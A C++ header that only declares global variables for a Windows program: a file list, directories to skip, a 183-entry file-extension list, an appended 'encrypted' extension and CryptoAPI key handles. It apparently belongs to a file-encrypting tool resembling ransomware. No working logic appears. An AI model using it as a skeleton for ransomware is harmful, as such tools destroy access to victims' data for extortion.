#include "stdafx.h"
extern std::vector<std::wstring> filesDB;
extern _WIN32_FIND_DATAW curItem;
extern TCHAR curPath[MAX_PATH];
extern LPWSTR ignoreDirs[16];
extern LPWSTR fileExts[183];
//extern HANDLE statFileHandle;
const extern std::wstring encExt;
extern HCRYPTKEY keyHandle;
extern HCRYPTKEY xchgKeyHandle;
extern DWORD keyBlobLen;
extern HCRYPTPROV provPtr;
extern std::wstring keyContainerPath;
extern BOOL action;